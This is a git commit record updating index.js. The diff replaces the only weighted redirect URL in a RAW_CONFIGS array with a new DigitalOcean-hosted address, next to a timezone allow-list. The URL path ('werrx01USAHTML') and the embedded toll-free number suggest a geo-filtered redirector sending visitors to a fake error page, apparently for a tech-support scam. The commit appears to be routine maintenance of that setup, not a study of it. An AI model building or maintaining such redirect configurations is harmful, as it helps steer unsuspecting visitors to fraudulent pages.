dd504eaf434a3c69db18b2977e28ebd3f60e18ec
paalakash <palaksh452@gmail.com>
2026-06-30 06:07:16 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://hammerhead-app-ap9z4.ondigitalocean.app/werrx01USAHTML/?bcda=1800-403-259", weight: 1.0 }
+    { url: "https://dolphin-app-bja4u.ondigitalocean.app/werrx01USAHTML/?bcda=1800-403-259", weight: 1.0 }
 
 ];
 
